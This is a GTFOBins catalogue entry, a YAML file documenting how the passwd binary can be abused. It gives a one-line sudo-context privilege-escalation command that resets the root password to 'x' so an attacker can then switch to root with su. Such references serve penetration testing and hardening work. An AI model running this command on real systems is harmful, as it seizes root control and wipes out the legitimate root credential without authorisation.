<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/passwd -->
---
functions:
  privilege-escalation:
  - code: |-
      echo -e 'x\nx' | passwd
    comment: |-
      This changes the root password to `x`, so it's now possible to log in using, for example, `su`.
    contexts:
      sudo:
...
